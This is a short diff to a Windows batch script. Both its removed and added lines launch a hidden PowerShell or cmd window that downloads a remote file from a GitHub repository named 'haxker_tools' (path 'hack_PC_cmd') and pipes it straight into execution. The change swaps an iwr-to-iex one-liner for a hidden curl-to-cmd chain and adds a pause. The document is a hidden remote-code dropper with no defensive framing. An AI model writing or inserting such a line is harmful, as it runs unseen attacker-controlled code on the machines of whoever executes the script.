@@ -1,4 +1,6 @@
 @echo off
-chcp 65001> nul
+chcp 65001 > nul
 
-powershell -WindowStyle Hidden -Command "iwr https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/a.txt -UseBasicParsing | iex"
+powershell -NoProfile -WindowStyle Hidden -Command "Start-Process cmd.exe -WindowStyle Hidden -ArgumentList '/c curl -s https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/hack_PC_cmd/a.txt | cmd'"
+
+pause
